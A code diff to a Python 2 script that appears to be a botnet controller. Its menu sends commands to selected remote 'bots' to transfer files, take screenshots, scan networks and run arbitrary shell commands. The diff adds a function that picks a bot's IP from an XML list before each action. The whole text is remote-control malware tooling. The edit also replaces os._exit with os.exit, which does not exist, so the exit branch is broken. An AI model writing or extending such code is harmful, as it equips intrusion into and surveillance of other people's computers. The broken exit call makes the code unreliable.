@@ -72,6 +72,13 @@ def view_bots():
         print('')
 
 
+def set_bot(bot_id):
+    bot_list = minidom.parse('bots.xml')
+    bots = bot_list.getElementsByTagName('bot')
+    bot = bots[int(bot_id)]
+    return bot.attributes['ip'].value
+
+
 def add_bot(client):
     # Add a bot to the database
 
@@ -112,6 +119,7 @@ def choice_error():
     # Print an error message in case the user selects a wrong action.
 
     print('Choice does not exist')
+
 
 def menu():
     # Print a menu with all the functionality.
@@ -292,26 +300,31 @@ while True:
         view_bots()
 
     elif select == 1:  # Send File
+        send_host = (set_bot(raw_input('pick a bot')))
         file_to_send = raw_input('The File >>> \n')
         send_file(file_to_send)
 
     elif select == 2:  # Get File
+        send_host = (set_bot(raw_input('pick a bot')))
         file_to_get = raw_input('The File >>> \n')
         get_file(file_to_get)
 
     elif select == 3:  # Tell bot to Screen Shot
+        send_host = (set_bot(raw_input('pick a bot')))
         take_ss()
 
     elif select == 4:  # Tell bot to Scan network
+        send_host = (set_bot(raw_input('pick a bot')))
         ip_to_scan = raw_input('Enter a IP + CIDR (ex.: 192.168.1.0/24) >>> \n')
         do_scan(ip_to_scan)
 
     elif select == 5:  # Tell bot to run a command
+        send_host = (set_bot(raw_input('pick a bot')))
         cmd_to_run = raw_input('The CMD >>> \n')
         send_cmd(cmd_to_run)
 
     elif select == 6:  # Exit the Script
-        os._exit(1)
+        os.exit(1)
 
     else:
         choice_error()
